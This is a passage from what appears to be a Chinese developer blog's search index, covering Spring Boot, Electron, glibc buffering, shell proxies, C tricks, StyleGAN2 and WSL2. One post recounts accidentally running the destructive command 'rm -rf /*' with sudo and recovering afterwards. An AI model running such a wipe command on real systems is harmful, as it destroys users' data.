/home/bakaft/java-projects/spring-boot-demo/src/main/resources[INFO][INFO] --- maven-compiler-plugin:3.10.1:compile (default-compile) @ spring-boot-demo ---[INFO] Nothing to compile - all classes are up to date[INFO][INFO] --- maven-resources-plugin:3.2.0:testResources (default-testResources) @ spring-boot-demo ---[INFO] Using 'UTF-8' encoding to copy filtered resources.[INFO] Using 'UTF-8' encoding to copy filtered properties files.[INFO] skip non existing resourceDirectory /home/bakaft/java-projects/spring-boot-demo/src/test/resources[INFO][INFO] --- maven-compiler-plugin:3.10.1:testCompile (default-testCompile) @ spring-boot-demo ---[INFO] No sources to compile[INFO][INFO] &lt;&lt;&lt; spring-boot-maven-plugin:2.7.0:run (default-cli) &lt; test-compile @ spring-boot-demo &lt;&lt;&lt;[INFO][INFO][INFO] --- spring-boot-maven-plugin:2.7.0:run (default-cli) @ spring-boot-demo ---[INFO] Attaching agents: [] . ____ _ __ _ _ /\\\\ / ___'_ __ _ _(_)_ __ __ _ \\ \\ \\ \\( ( )\\___ | '_ | '_| | '_ \\/ _` | \\ \\ \\ \\ \\\\/ ___)| |_)| | | | | || (_| | ) ) ) ) ' |____| .__|_| |_|_| |_\\__, | / / / / =========|_|==============|___/=/_/_/_/ :: Spring Boot :: (v2.7.0)2022-05-24 19:26:10.087 INFO 900 --- [ main] MyApplication : Starting MyApplication using Java 11.0.15 on BakaFT-PC with PID 900 (/home/bakaft/java-projects/spring-boot-demo/target/classes started by bakaft in /home/bakaft/java-projects/spring-boot-demo)2022-05-24 19:26:10.090 INFO 900 --- [ main] MyApplication : No active profile set, falling back to 1 default profile: &quot;default&quot;2022-05-24 19:26:10.547 INFO 900 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat initialized with port(s): 8080 (http)2022-05-24 19:26:10.554 INFO 900 --- [ main] o.apache.catalina.core.StandardService : Starting service [Tomcat]2022-05-24 19:26:10.554 INFO 900 --- [ main] org.apache.catalina.core.StandardEngine : Starting Servlet engine: [Apache Tomcat/9.0.63]2022-05-24 19:26:10.612 INFO 900 --- [ main] o.a.c.c.C.[Tomcat].[localhost].[/] : Initializing Spring embedded WebApplicationContext2022-05-24 19:26:10.612 INFO 900 --- [ main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 496 ms2022-05-24 19:26:10.698 WARN 900 --- [ main] o.s.b.a.AutoConfigurationPackages : @EnableAutoConfiguration was declared on a class in the default package. Automatic @Repository and @Entity scanning is not enabled.2022-05-24 19:26:10.819 INFO 900 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat started on port(s): 8080 (http) with context path ''2022-05-24 19:26:10.826 INFO 900 --- [ main] MyApplication : Started MyApplication in 0.995 seconds (JVM running for 1.205) 看一下效果 12bakaft@BakaFT-PC:~$ curl http://localhost:8080 -w '\\n'Hi!This is my first Spring Boot application from scratch","link":"/2022/05/24/Ubuntu%E4%B8%8B%E9%83%A8%E7%BD%B2Spring-Boot-2-7%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"},{"title":"Vite2+Vue3+Electron16 环境配置","text":"使用 Yarn以获得更好的体验 1npm install -g yarn 也许后面你需要对~/.yarnrc添加以下内容，以方便进行 Electron 的安装 123ELECTRON_BUILDER_BINARIES_MIRROR &quot;http://npm.taobao.org/mirrors/electron-builder-binaries/&quot;electron_mirror &quot;https://cdn.npm.taobao.org/dist/electron/&quot;registry &quot;https://registry.npm.taobao.org/&quot; 安装 Vite本段完全参考 开始 | Vite 官方中文文档 安装时根据情况选择模板即可 123456789101112131415161718192021&gt;&gt;yarn create viteyarn create v1.22.17[1/4] 🔍 Resolving packages...[2/4] 🚚 Fetching packages...[3/4] 🔗 Linking dependencies...[4/4] 🔨 Building fresh packages...success Installed &quot;create-vite@2.6.6&quot; with binaries: - create-vite - cva✔ Project name: … my-project✔ Select a framework: › vue✔ Select a variant: › vueDone. Now run: cd my-project yarn yarn dev✨ Done in 11.20s. 现在，你可以通过 yarn vite 运行开发服务器 123456vite v2.6.14 dev server running at:&gt; Local: http://localhost:3000/&gt; Network: use `--host` to exposeready in 252ms. 安装 Electron引入在 Vite 项目目录下运行 1yarn add --dev electron 如果出现网络问题，也许你需要配置一下镜像，参考第一部分 配置 package.json你的package.json应该是这样的 1234567891011121314151617{ &quot;name&quot;: &quot;elec-lib&quot;, &quot;version&quot;: &quot;0.0.0&quot;, &quot;scripts&quot;: { &quot;dev&quot;: &quot;vite&quot;, &quot;build&quot;: &quot;vite build&quot;, &quot;serve&quot;: &quot;vite preview&quot;, }, &quot;dependencies&quot;: { &quot;vue&quot;: &quot;^3.2.16&quot; }, &quot;devDependencies&quot;: { &quot;@vitejs/plugin-vue&quot;: &quot;^1.9.3&quot;, &quot;electron&quot;: &quot;^16.0.2&quot;, &quot;vite&quot;: &quot;^2.6.4&quot; }} 为保证 Electron 可运行，添加如下内容 12&quot;main&quot;: &quot;main.js&quot;,&quot;license&quot;: &quot;MIT&quot;, //你可以不填，只是会警告 为方便，可以在scripts下新增 1&quot;elec&quot;: &quot;electron .&quot; 以便你可以在项目根目录运行yarn elec时打开 Electron 配置必要内容本段内容基于 快速入门 | Electron (electronjs.org) main.js1234567891011121314151617181920212223242526const { app, BrowserWindow } = require('electron')const path = require('path')function createWindow () { const win = new BrowserWindow({ width: 800, height: 600, webPreferences: { preload: path.join(__dirname, 'preload.js') } }) // 此处更换为 Vite项目的地址 win.loadURL('http://localhost:3000')}app.whenReady().then(() =&gt; { createWindow() app.on('activate', () =&gt; { if (BrowserWindow.getAllWindows().length === 0) { createWindow() } })})app.on('window-all-closed', () =&gt; { if (process.platform !== 'darwin') { app.quit() }}) preload.js暂时置空，文件不存在则无法运行 Electron 开发测试方法你需要两个终端进行完整的测试操作 Vite 对 Vue 项目进行构建，运行在http://localhost:3000 随后启动 Electron，嵌套该页面 首先使用 Vite 对项目进行构建，并自动发布 1yarn vite 然后运行 Electron 1yarn elec 在 Vue 中使用 Electron出于 Electron 的 流程模型 设计，你无法直接在 Vue 中访问形如process的对象 但是你可以通过preload.js实现，例子如下 preload.js1234const { contextBridge } = require('electron')contextBridge.exposeInMainWorld('$electron', { title: process.versions.electron}) App.vue12345678&lt;script setup&gt;import HelloWorld from './components/HelloWorld.vue'const message = &quot;Electron version:&quot; + window.$electron.title&lt;/script&gt;&lt;template&gt; &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot; /&gt; &lt;HelloWorld :msg=&quot;message&quot; /&gt;&lt;/template&gt; 打包Vite 构建打包路径配置由于 Vite 默认构建时使用绝对路径，所以需要改动vite.confjg.js 123456// https://vitejs.dev/config/export default defineConfig({ // ... base:'./' // ...}) 然后使用yarn build进行打包 1234567891011&gt;&gt;yarn build yarn run v1.22.17$ vite buildvite v2.6.14 building for production...✓ 14 modules transformed.dist/assets/logo.03d6d6da.png 6.69 KiBdist/index.html 0.49 KiBdist/assets/index.547320a6.js 1.90 KiB / gzip: 1.01 KiBdist/assets/index.16c4fe9c.css 0.20 KiB / gzip: 0.17 KiBdist/assets/vendor.0f8d2e2f.js 49.63 KiB / gzip: 19.94 KiB✨ Done in 1.14s. Electron 构建修改页面载入方式无须解释 1234567891011function createWindow () { const win = new BrowserWindow({ width: 800, height: 600, webPreferences: { preload: path.join(__dirname, 'preload.js') } }) // win.loadURL('http://localhost:3000') win.loadFile('./dist/index.html')} 使用 Electron Forge安装 1234567891011121314yarn add --dev @electron-forge/clinpx electron-forge import✔ Checking your system✔ Initializing Git Repository✔ Writing modified package.json file✔ Installing dependencies✔ Writing modified package.json file✔ Fixing .gitignoreWe have ATTEMPTED to convert your app to be in a format that electron-forge understands.Thanks for using &quot;electron-forge&quot;!!! 使用yarn make进行构建 123456789101112&gt;&gt;yarn make yarn run v1.22.17$ electron-forge make✔ Checking your system✔ Resolving Forge ConfigWe need to package your application before we can make it✔ Preparing to Package Application for arch: x64✔ Preparing native dependencies✔ Packaging ApplicationMaking for the following targets: zip✔ Making for target: zip - On platform: darwin - For arch: x64✨ Done in 14.95s. 你可以在out文件夹下找到构建目标 如果需要跨平台构建，请自行查阅 Electron Forge 文档","link":"/2021/11/29/Vite2-Vue3-Electron16-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"title":"Zsh下程序输出后出现诡异的百分号分析","text":"问题代码如下 1234567#include &lt;stdio.h&gt;int main(void){ int a; a = 16; printf(&quot;%d&quot;,a); return 0;} 输出 116% 而当我修改输出语句为 1printf(&quot;%d\\t&quot;,a); 116 % 添加\\n后输出正常 1printf(&quot;%d\\n&quot;,a); 116 但是我切换到Bash却没有这个问题，一切按照预期输出 原因只能说中文搜索引擎还是有点逆天，搜到的全是别人问怎么输出百分号。。 上谷歌搜了一下，找到 Stackoverflow 的一个问答 Getting a weird percent sign in printf output in terminal with C - Stack Overflow 其中有个回答指出 When (non-null) output from a program doesn’t include a trailing newline, zsh adds that color-inverted % to indicate that and moves to the next line before printing the prompt; it’s generally more convenient than bash’s behavior, just starting the command prompt where the output ended. 也就是没加\\n时，Zsh会自动给你输出一个百分号然后换行。而bash选择直接是不换行，接着输出。","link":"/2021/05/24/Zsh%E4%B8%8B%E7%A8%8B%E5%BA%8F%E8%BE%93%E5%87%BA%E5%90%8E%E5%87%BA%E7%8E%B0%E8%AF%A1%E5%BC%82%E7%9A%84%E7%99%BE%E5%88%86%E5%8F%B7%E5%88%86%E6%9E%90/"},{"title":"glibc的三种缓冲策略","text":"很多朋友可能在初次学习 C 语言时，如果是使用 Unix 环境，可能遇到过如下的问题 123456#include &lt;stdio.h&gt;int main(){ printf(&quot;Hey&quot;); return 0;} 欸我运行完了怎么没输出呢？Google 一番才知道，这是由于所谓缓冲(Buffer)机制导致的 这个时候，你需要在 格式化串的结尾加一个\\n，就可以看到输出了 这是因为，标准输出是基于行缓冲(Line Buffered) 策略的，它遇到\\n时，会将缓冲区内容打包送出，这才可以看到要输出的字符串 除了行缓冲之外，glibc还有两种策略，详见下节 三种缓冲策略根据 Buffering Concepts (The GNU C Library) 存在三种缓冲策略， unbuffered 不存在缓冲概念，字符一个一个被传输 line buffered 行缓冲，遇到换行符时，将缓冲区内容发出 fully buffered 全缓冲，当缓冲区内容到达指定大小时，将缓冲区内容发出 并且 Newly opened streams are normally fully buffered, with one exception: a stream connected to an interactive device such as a terminal is initially line buffered. 新打开的流应该都是全缓冲的，然而有一个例外：该流与互动式设备（如终端)，那么它就是行缓冲的 缓冲区的刷新刷新一个被缓冲的流是指，将缓冲区中堆积的字符发送给文件。有许多情形下，刷新操作将自动进行： 准备进行输出，并且缓冲区已满 流关闭时 程序调用exit时 行缓冲策略下，遇到\\n时 Whenever an input operation on any stream actually reads data from its file. 如果你想主动刷新，那么请调用fflush(FILE *stream) 注意：fflush通常用于刷新输出流，对于输入流的操作请详阅 manual page 缓冲策略的控制在你打开一个流之后，并且在对它操作之前，你可以通过setbuf系列函数显式指定他的缓冲策略，以及控制其缓冲区大小 Macro: int _IOFBF 用于说明流为全缓冲 Macro: int _IOLBF 用于说明流为行缓冲 Macro: int _IONBF 无缓冲 Macro: int BUFSIZ 用于描述缓冲区大小，这个值被保证至少为 256。这个宏是基于不同操作系统而设定的，所以最好使用它来作为setvbuf的函数 实际上，你还可以通过fstat来获取文件的st_blksize，即块大小，使用它来作为流的缓冲大小 改变流的缓冲策略 1234567891011121314int setvbuf(FILE *restrict stream, char *restrict buf, int mode, size_t size);void setbuf(FILE *restrict stream, char *restrict buf);void setlinebuf (FILE *stream)// Open a Stream, fully buffered by defaultFILE *fp = fopen(&quot;log.log&quot;, &quot;w&quot;);// Set it unbuffered// equivalent to // setbuf(fp,NULL);setvbuf(fp, NULL, _IONBF, 0);// set it line bufferedsetlinebuf(fp); 缓冲策略的检测 Function: int __flbf (FILE *stream) 如果流为行缓冲，则返回一个非 0 值，否则返回 0 Function: size_t __fbufsize (FILE *stream) 返回指定流的缓冲区大小 Function: size_t __fpending (FILE *stream) 返回指定流的缓冲区中内容大小，以字节为单位。此函数不应用于目的为读的流。 glibc似乎只提供了行缓冲的检测方法 为什么我写这个你可能会说，我擦，就这点事你把全村人叫过来？ 其实我是遇到了另一个问题，看代码，这个 空文件 logtest.log会被写入什么内容？ 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;int main(){ int pid; FILE *fp = fopen(&quot;logtest.log&quot;, &quot;w&quot;); fprintf(fp, &quot;hello world\\n&quot;); pid = fork(); if (pid == 0) { ; } else { wait(NULL); exit(1); }} 如果你以为是hello world\\n，那你就错了 答案是hello world\\nhello world\\n，如果你不知道为什么，请看下方解析： fork会复制(准确来说是 copy-on-write)父进程的内存空间，其中包括了 输出缓冲区 新打开的流应该都是全缓冲的，然而有一个例外：该流与互动式设备（如终端)，那么它就是行缓冲的 程序调用exit时，会自动刷新缓冲区，将内容全部推到流中 你觉得这个字符串是在父进程写入，并且子进程什么都没干，是因为默认了fp是行缓冲的，但其实它不是 真实的情况是： 父进程将hello world\\n写入了缓冲区，因为fp是全缓冲的，所以字符串并没有立刻输出到文件 fork之后，子进程没事情可以干，于是隐式调用了exit，将复制来的缓冲区内容推到了fp 父进程等待子进程结束，随后显式调用exit，将缓冲区中的内容推到fp 所以文件里有两次输出 其实所谓exit的隐式调用，是因为main本身是这样被执行的 _start __libc_start_main main main 的执行方式可以简化为 1exit(main(argc, argv)); 所以无论是 在main中显式调用exit 使用return(包括编译器自动加上的情况) 返回值为void（最后会返回一个随机数字，不太清楚原理） 进程都会调用exit收尾，缓冲区一定会被刷新 一个很不错的参考： 链接、装载与库 — 运行库 | Technology Blog (markrepo.github.io)","link":"/2022/10/01/glibc%E7%9A%84%E4%B8%89%E7%A7%8D%E7%BC%93%E5%86%B2%E7%AD%96%E7%95%A5/"},{"title":"一次rm -rf &#x2F;* 抢救经历","text":"果然偶尔看一下别人的抢救经历还是有用的。。 玩计算机这么久，也见过不少 rm -rf /*`的笑话了，没想到这次搞到我自己头上来了 复盘当时是想把 WSL2 某个文件夹下的内容全部删掉，所以要执行 1$ rm -rf ./* 结果呢，手滑了，少打一个点，执行完了我还寻思这权限都不够？直接加sudo干上去（妈妈的真的是一秒都没犹豫） 我好像执行到一半^C掉又给执行了一次，然后我再仔细一看这报错，不对劲啊？ 当我意识到不太对劲的时候，赶紧打了个ls /，然后 bash 回了我一句: 1-bash: /bin/ls: No such file or directory …彳亍 我确实看过一些抢救文章，不过细节忘了个七七八八了，大致检查了一下，常用命令没几个活着的，要么就活着也用不了(ssh因为/dev/null不存在无法使用) 可以确定的是这些东西还活着： curl glibc 抢救一定要冷静，第一时间先把命令停下来，然后保持所有终端 使用 curl 下载 busybox 可执行文件，尝试执行，发现无权限 使用 curl 下载远程主机上的 chmod，尝试/lib64/ld-linux-x86-64.so.2 chmod执行，报错file too short，可能是和 glibc 不兼容？ 转换思路，直接摆脱 glibc，尝试在远程主机对 coreutils 静态编译，搞出一个直接跑的 chmod 二进制 搜索后找到 luciusmagn/coreutils-static，这是一个使用 musl 静态编译 coreutils 的脚本 立刻 clone 到远程主机，开始编译 编译完毕后使用python3 -m http.server 80开启 web 服务器 使用 curl 下载远程机器的chmod二进制文件 没有执行·chmod的权限，怎么搞呢？搜了半天，发现install的-m参数可以做到 chmod 做的事情，并且它还在活着 执行install -m a+x ./chmod ~，把它扔到用户目录下，并赋予执行权 ./chomod 777 busybox &amp;&amp; busybox 出现 busybox 的帮助信息 开始抢救文件，由于是 WSL2，所以直接将文件通过/mnt的映射拷贝到 Windows 结束，重新开一个 WSL2 实例，想要完全恢复难度太高了","link":"/2022/11/04/%E4%B8%80%E6%AC%A1rm-rf-%E6%8A%A2%E6%95%91%E7%BB%8F%E5%8E%86/"},{"title":"不同Shell下的代理设置","text":"Why鉴于日益严峻的网络形势，先写个文章记录一下各个 Shell 的代理设置，方便后续使用 (感觉不如…搞个 dot file repo) Shell*sh不太清楚是不是所有发行版和 Shell 都支持all_proxy，一起写上总没错:) 123456789101112131415# Replace with your own server configexport host_ip=&lt;host ip&gt;export port=&lt;port&gt;function proxyOn() { export all_proxy=http://$host_ip:$port export http_proxy=$all_proxy export https_proxy=$all_proxy echo -e &quot;Proxies turned on&quot;}function proxyOff(){ unset all_proxy http_proxy https_proxy echo -e &quot;Proxies turned off&quot;} PowershellWindows11 21H2 实测是跟随系统代理的 一些特殊情况WSL2WSL2 由于使用了虚拟机，所以会使用一个虚拟网卡与主机通信，并且 IP 会发生动态变化 可以通过查询 WSL2 主机 DNS 服务器的方法间接获得宿主机地址 123456789101112131415# Replace with your own server configexport host_ip=$(cat /etc/resolv.conf | grep nameserver | awk '{ print $2 }')export port=1080function proxyOn() { export all_proxy=http://$host_ip:$port export http_proxy=$all_proxy export https_proxy=$all_proxy echo -e &quot;Proxies turned on&quot;}function proxyOff(){ unset all_proxy http_proxy https_proxy echo -e &quot;Proxies turned off&quot;} Git你可以通过如下命令为 Git 设置代理 123456# This is managed by git, not shell.git config --global http.proxy http://$host_ip:$portgit config --global https.proxy http://$host_ip:$portgit config --global --unset http.proxygit config --global --unset https.proxy 这等效于编辑~/.gitconfig 1234[http] proxy = http://$host_ip:$port[https] proxy = http://$host_ip:$port 快速验证代理*sh123456789root@BakaFT-PC:~# curl cip.ccIP : ****地址 : 美国 美国数据二 : 美国 | Microsoft数据中心数据三 : 美国 | 微软URL : http://www.cip.cc/**** Powershell123456PS C:\\Users\\Administrator&gt;curl api.ipify.orgStatusCode : 200StatusDescription : OKContent : **** // Your IP Address will be shown here// .... 参考WSL2 中访问宿主机 Windows 的代理 - ZingLix Blog 终端使用代理加速的正确方式（Shadowsocks） - SegmentFault 思否","link":"/2022/05/21/%E4%B8%8D%E5%90%8CShell%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/"},{"title":"为什么1&#x2F;2&#x3D;0?","text":"C primer plus 课后作业 3.11.8 1234567891011#include &lt;stdio.h&gt;int main(void){ int cup; //1cup=0.5pint=8ounce=16big=48small printf(&quot;How many cups?\\n&quot;); scanf(&quot;%d&quot;,&amp;cup); printf(&quot;%d Cup is %f in pint,%d in ounce,%d in big and %d in small&quot;,cup, cup/2, cup*8, cup*16, cup*48);} //output: 1 Cup is 0 in pint,8 in ouns,16 in big and 48 in small//cup/2改成cup*0.5//output: 1 Cup is 0.500000 in pint,8 in ounce,16 in big and 48 in small 查阅发现C 的除法，当两边都是整型值时，做整数除法，得到的也是整数，并会对形如5/3的运算结果做截断处理，并且不四舍五入 如果两边至少有一个为 float 或者 double，那么将做浮点数除法，1.0/2=0.5 。 C 并不推荐这种混合类型的除法运算，因为计算机原理上无法做到浮点数除以整数的运算。用浮点数除以整数时，C 编译器只是将整数转换为了浮点数 123 float c=2.0; printf(&quot;%f&quot;,cup/c); //output : 0.500000","link":"/2020/02/26/%E4%B8%BA%E4%BB%80%E4%B9%881-2-0/"},{"title":"使用GNU C扩展实现C的反射","text":"说明：此机制并非传统意义上的反射，仅为一种类似的实现 我最近在写一个 Sandbox，需要根据命令行参数选择对应的规则函数执行。如果硬编码，这是非常痛苦的，所以我在 Google 搜了一会，发现了如下的办法，相比硬编码要好许多。 什么是 GNU C 扩展众所周知，编译器不只是在翻译，还有优化、错误检查等许多工作，所以就催生了许多编译属性标识的产生。 你翻阅许多开源项目源码的时候肯定会看到一堆 define 和下划线的东西，比如__attribute__、__builtin_expect等。这些标识都是在给编译器传递信息，告诉它需要做什么事情，从而使得编译工作可以根据需要灵活调整。 这些被称为 C Extensions，即 GNU C 扩展 __attribute__((section))在如此之多的扩展之中，有一项__attribute__((section))，用于修饰变量 根据官网文档的说明： Normally, the compiler places the objects it generates in sections like data and bss. Sometimes, however, you need additional sections, or you need certain particular variables to appear in special sections, for example to map to special hardware. The section attribute specifies that a variable (or function) lives in a particular section. 通常来说，编译器把生成的对象放在bss、data这样的段。但是有时候你需要把对象放到一个特定的段中，比如特定的硬件映射。 这个标识符将被修饰对象放置于section段中 所以，你可以做到这样的事情： 123456789101112131415// 定义变量，并放置于test段int __attribute__((section(&quot;mysec&quot;))) a = 123;int __attribute__((section(&quot;mysec&quot;))) b = 456;// 你尽管用extern声明，编译器会自动处理extern int __start_mysec; extern int __stop_mysec; void func(){ int* mysec = &amp;__start_mysec; int my_a = mysec[0]; int my_b = mysec[1]; printf(&quot;a=%d b=%d\\n&quot;, my_a, my_b); // a=123 b=456} 编译器会自动定义__start##section和__end##section两个变量，分别指向该段的头尾，你可以使用它们进行访问范围控制 另外还需要注意的: Use the section attribute with global variables and not local variables 只能修饰全局变量，所以注意作用域！ 实现反射机制直接把成品摆出来，下面解释 123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;#include &lt;string.h&gt;struct func{ void (*fn)(void); const char *func_name;};#define reflect(x) __attribute__((section(&quot;functions&quot;))) struct func __##x = {x, #x};void func1(void){ printf(&quot;func1\\n&quot;);}void func2(void){ printf(&quot;func2\\n&quot;);}reflect(func1);reflect(func2);int main(void){ char * function_to_be_executed = &quot;func2&quot;; extern struct func __start_functions; extern struct func __stop_functions; for(struct func *f = &amp;__start_functions; f &lt; &amp;__stop_functions; f++) { if(strcmp(f-&gt;func_name, function_to_be_executed) == 0) { f-&gt;fn(); } } return 0;} 123bakaft@BakaFT-PC:~/oj$ gcc section_test.c bakaft@BakaFT-PC:~/oj$ ./a.out func2 可以看到，这里根据我们定义的字符串，执行了对应的函数，也就达到了目的。 原理1#define reflect(x) __attribute__((section(&quot;functions&quot;))) struct func __##x = {x, #x}; 根据刚才的知识，这个宏的结果就是把一个struct func放到了程序的·functions段 这个结构体存放了一个指向函数x的函数指针，和一个值为x的字符串。这样就可以在后面使用循环，遍历functions段，寻找到我们需要的函数了 参考利用__attribute__((section))实现 C 语言反射 | 自增人生 (ixx.life)","link":"/2022/09/30/%E4%BD%BF%E7%94%A8GNU-C%E6%89%A9%E5%B1%95%E5%AE%9E%E7%8E%B0C%E7%9A%84%E5%8F%8D%E5%B0%84/"},{"title":"使用Python处理Markdown front matter","text":"什么是 Front matter在你使用Hexo等基于Markdown的静态博客生成系统时，工具为你所生成的 md 文件开头通常会有一个符合YAML语法的代码段 比如我现在正在写的这篇文章，它的开头是这样的： 1234567---title: 使用Python处理Markdown front mattertoc: truedate: 2022-05-21 20:38:07tags:- Python--- 这就是 Front matter，它可以为 Markdown 文件提供一些基本的信息 为什么要搞这个今天更换了一下博客的主题，新的主题如果要显示文章目录的话，需要在Front Matter中加入toc: true 以后的文章我可以通过修改scaffolds来解决，以前的文章要怎么搞呢？ 所幸我在一番搜索后找到了一个不错的选项，找到了python-frontmatter ，这个包的用法十分简单，一两分钟就可以上手 根据我的情况，我写了一个小 demo，这样就可以为所有之前的文章添加一个toc字段了 12345678910111213141516171819202122232425262728293031323334353637383940import frontmatter import os HEXO_POSTS_DIR = &quot;path-to-_posts&quot; def getFilesFromPath(path): files = [] for file in os.listdir(path): filename = os.path.join(path, file) files.append(filename) # For those who are using Obsidian files.remove(HEXO_POSTS_DIR + &quot;\\\\.obsidian&quot;) return files def printTitle(markdownFiles): for file in markdownFiles: post = frontmatter.load(file) print(post[&quot;title&quot;]) def printnAllMetadata(files): for file in files: post = frontmatter.load(file) print(post.metadata) def addTocToFile(markdownFiles): for file in markdownFiles: post = frontmatter.load(file) print(&quot;&gt;&gt;&quot; + post[&quot;title&quot;]) if &quot;toc&quot; in post: print(&quot;Toc already existed&quot;) else: post[&quot;toc&quot;] = True with open(file,&quot;wb&quot;) as f: frontmatter.dump(post, f) print(&quot;Toc added&quot;) markdownFiles = getFilesFromPath(HEXO_POSTS_DIR) addTocToFile(markdownFiles)","link":"/2022/05/21/%E4%BD%BF%E7%94%A8Python%E5%A4%84%E7%90%86Markdown-front-matter/"},{"title":"使用StyleGAN2-Ada模型生成高清晰度甘雨头像","text":"StyleGAN2-ADA 迁移学习实验介绍使用 StyleGAN2-ADA 模型对动漫《Re：从零开始的异世界生活》中的角色蕾姆进行训练后，在此基础上使用游戏《原神》中的角色甘雨脸部数据集进行训练 由于两个角色的面部特征较为相似，所以相对于使用大量动漫面部数据集训练出的模型，进行迁移学习应该会更快的收敛，并产生较好的结果 实验设计模型已经在蕾姆面部数据集上预训练过的 StyleGAN2-ADA 模型 数据集数据图片来自 Danbooru 动漫图片数据库，共 850 张处理好的甘雨面部图片，分辨率为512*512 训练下载 StyleGAN2-ADA1234pip install pyspng ninja imageio-ffmpeg==0.4.3git clone https://github.com/NVlabs/stylegan2-ada-pytorchpip install gdown %cd ./stylegan2-ada-pytorch 预处理数据集1python dataset_tool.py --source=/kaggle/input/ganyu-genshin-impact-anime-faces-gan-training/ganyu/ganyu-final --dest=./datasets/ganyu.zip 开始训练参考英伟达开源文档，采取如下配置 1python train.py --outdir ./results --snap=4 --cfg=paper512 --data=./datasets/ganyu.zip --augpipe=&quot;bg&quot; --mirror=True --metrics=None --resume=/kaggle/input/ganyu-genshin-impact-anime-faces-gan-training/ganyu/rem-pretrained.pkl --augpipe=&quot;bg&quot; --kimg=145 训练过程平均稳定在 38000s 左右 实验结果使用最后一次快照进行生成，Truncation 值取 1，种子范围为 1-1000，取出部分表现较好样本作为例子 生成样本 面部插值变换基于 GAN 隐空间的连续性，可以通过对两个隐向量进行线性插值的方法实现两张面部图片的平滑变换 在 StyleGAN2 中的隐向量通过seed产生，此处给出几个不同种子代表的面部图片的插值结果 实验体会由于这次实验的题目是开放的，所以我做了大量的资料查找和选择，最终选择了较为实用的 StyleGAN2（高分辨率图像以及非常逼真的效果，都可以拿来做头像了），相比之前做过的 DCGAN 之类，更有实际意义 这门课属于选修，我自己并没有太好的数学基础的情况下学的也只能说是一知半解。整个实验的过程也是一个不断学习的过程，让我学会基本的炼丹流程，以及一些基本的学术技能，比如上 arxiv 读论文，上 kaggle/colab 去自己做实验等等 可惜的是本次实验时间不够导致制作了单个图像生成和潜空间插值，没有足够的时间用来做风格控制 总体来说收获还是比较大的，如果自己以后走这条方向的话这将是很有用处的","link":"/2022/04/20/%E4%BD%BF%E7%94%A8StyleGAN2-Ada%E6%A8%A1%E5%9E%8B%E7%94%9F%E6%88%90%E9%AB%98%E6%B8%85%E6%99%B0%E5%BA%A6%E7%94%98%E9%9B%A8%E5%A4%B4%E5%83%8F/"},{"title":"在WSL2中安装任意Linux发行版","text":"为什么因为我要准备EDK2的开发环境，但是我不想污染自己之前在用的 WSL 发行版 我在安装Docker之后发现 WSL 多出了两个发行版本docker-desktop和docker-desktop-data。这个我是知道为什么的，因为 Windows 上的 Docker 其实只是套壳，本质上还是用 Linux 版本的 Docker 进行工作的。不过重点不是这个，重要的是这个说明 WSL 可以安装多个 Linux distro 我第一反应是去 MSDN 看一下，搜multi distro，果然有对应的文档：Import any Linux distribution to use with WSL | Microsoft Docs 接下来围绕文档进行说明和操作 从本地导入 Linux distro tar 镜像文档中提到，你可以通过导入tar包的方式安装任何 Linux 发行版，方法是使用如下命令： 1wsl --import &lt;Distro name&gt; &lt;InstallLocation&gt; &lt;FileName&gt; 那么这个 tar 包要从哪里来呢？包括但不限于以下来源： 从某些发行版的官网下载针对 WSL2 优化的容器镜像 将某个发行版的 Docker 容器导出作为镜像 将目前运行的 WSL 实例导出后再次导入 从发行版官网下载镜像你可以在cloud-images.ubuntu.com的镜像库中找到任意版本的 Ubuntu 服务器 WSL 专用镜像，其他发行版的服务器版本应该也会提供 比如你可以在Ubuntu 21.04版本的目录中找到ubuntu-21.04-server-cloudimg-amd64-wsl.rootfs.tar.gz，作为要使用的镜像 下载完成后，执行相关操作： 123456789101112131415PS D:\\&gt; mkdir ubuntu_instance 目录: D:\\Mode LastWriteTime Length Name---- ------------- ------ ----d----- 2022/5/21 22:30 ubuntu_instancePS D:\\&gt; cd vhdsPS D:\\vhds&gt; wsl --import my-ubuntu D:\\ubuntu_instance D:\\OS_Images\\ubuntu-21.04-server-cloudimg-amd64-wsl.rootfs.tar.gzPS D:\\vhds&gt; ls 目录: D:\\vhdsMode LastWriteTime Length Name---- ------------- ------ -----a---- 2022/5/21 22:31 1274019840 ext4.vhdx 可以看到，ext4.vhdx就是要提供给Hyper-V用的虚拟硬盘文件了，现在它已经被注册到 WSL2 中，你可以随时启动它 12345678910111213141516171819202122232425262728293031PS D:\\ubuntu_instance&gt; wsl -l适用于 Linux 的 Windows 子系统分发版:Ubuntu-20.04 (默认)my-ubuntudocker-desktopdocker-desktop-dataedk2PS D:\\ubuntu_instance&gt; wsl -d my-ubuntuWelcome to Ubuntu 21.04 (GNU/Linux 5.10.16.3-microsoft-standard-WSL2 x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat May 21 22:34:47 CST 2022 System load: 0.0 Processes: 8 Usage of /: 0.5% of 250.98GB Users logged in: 0 Memory usage: 2% IPv4 address for eth0: 172.27.197.78 Swap usage: 0%0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateThis message is shown once a day. To disable it please create the/root/.hushlogin file.root@BakaFT-PC:/mnt/d/ubuntu_instance# Docker ubuntu 容器仓库现成的容器镜像，感谢开源社区的馈赠 22.04 的容器竟然只有不到 30MB.. tianon/docker-brew-ubuntu-core: Official imports of the Ubuntu Core tarballs for use in Docker (previously from https://partner-images.canonical.com/core/) (github.com) 自行导出 Docker 容器作为镜像呃呃。。不想自己试了。如果确实有需求请查阅文章开头给出的 MSDN 文档，或者寻找其他博主的文章 将现有 WSL 实例导出作为镜像使用wsl --export &lt;Distro name&gt; &lt;Output path&gt;，即可得到你原来发行版的克隆镜像 镜像安装后续设置安装 sudo 并新建个人用户这个教程针对那些用作 Docker 容器的镜像 